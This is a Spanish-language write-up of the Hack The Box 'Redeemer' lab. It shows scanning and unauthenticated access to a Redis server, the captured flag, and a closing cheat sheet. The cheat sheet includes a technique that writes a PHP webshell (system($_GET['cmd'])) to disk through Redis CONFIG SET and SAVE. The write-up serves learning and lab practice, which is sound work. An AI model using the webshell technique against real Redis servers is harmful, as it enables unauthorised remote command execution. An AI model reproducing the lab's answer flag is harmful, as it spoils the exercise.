# Write-Up: Redeemer - Hack The Box (Starting Point)

**Fecha:** 9 de Diciembre 2025
**Dificultad:** Easy
**Servicio Clave:** Redis 5.0.7 (puerto 6379)
**Aprendizaje Principal:** Pentesting de servicios de bases de datos NoSQL sin interfaz web.

## 1. Reconocimiento
- **Problema inicial:** Escaneo de puertos comunes (`--top-ports 50`) no mostró servicios.
- **Solución:** Escaneo dirigido al puerto conocido de Redis (6379) con `nmap -p 6379 -sV -sC`.
- **Hallazgo:** `6379/tcp open redis Redis key-value store 5.0.7`.

## 2. Enumeración y Acceso
- **Herramienta:** `redis-cli` (instalado via `pkg install redis` en Termux).
- **Comando de conexión:** `redis-cli -h 10.129.18.130 -p 6379`.
- **Configuración:** **Sin autenticación** (`AUTH` no requerido), permitiendo acceso completo.

## 3. Explotación y Obtención de Flag
- **Comando de enumeración de datos:** `KEYS *` para listar todas las claves almacenadas.
- **Comando para leer el valor:** `GET [nombre_de_la_clave]` (la clave contenía la flag).
- **Flag obtenida:** `03e1d2b376c37ab3f5319922053953eb`

## 4. Lecciones Aprendidas y Conocimientos Clave
1.  **No confiar solo en escaneos automáticos:** Los servicios en puertos no estándar requieren enfoque manual.
2.  **Importancia de la enumeración de servicios:** Identificar la versión exacta (5.0.7) fue crucial.
3.  **Interacción directa con protocolos:** Aprender los comandos básicos del servicio objetivo (`redis-cli`, `INFO`, `KEYS *`, `GET`) es a menudo la explotación en sí.
4.  **Seguridad en configuraciones por defecto:** Redis sin autenticación es un error de configuración grave y común en entornos reales.

## 5. Comandos de Redis Clave para Pentesting
```bash
# Conectar
redis-cli -h [IP] -p 6379
# Enumerar
INFO
KEYS *
# Leer datos
GET [clave]
# En sistemas vulnerables, intentar ejecución de comandos (RCE)
CONFIG SET dir /tmp
CONFIG SET dbfilename shell.php
SET test "<?php system($_GET['cmd']); ?>"
SAVE
